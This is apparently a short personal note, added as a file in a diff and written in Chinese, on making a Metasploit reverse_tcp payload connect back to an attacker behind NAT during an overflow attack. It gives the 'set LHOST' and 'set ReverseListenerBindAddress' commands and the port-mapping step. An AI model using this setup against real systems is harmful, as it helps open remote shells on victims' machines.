@@ -1,0 +1,14 @@
+Env:
+  Attacker --- FireWall(Nat) ----- Internet ----- FireWall(Nat) --- Victim
+192.168.1.2     88.67.33.22                       43.22.32.17     192.168.3.2
+
+问题：
+进行一次溢出攻击时，在设置PAYLOAD(reverse_tcp)的LHOST的时候
+只有设置外网IP(88.67.33.22)才能成功反弹回来
+但是，这样攻击者本机是无法绑定到88.67.33.22的网络接口上，就没办法实行攻击
+
+解决：
+set LHOST 88.67.33.22
+set ReverseListenerBindAddress 192.168.1.2
+这样反弹到的IP是88.67.33.22，绑定的IP是192.168.1.2
+那么只需要NAT映射端口即可
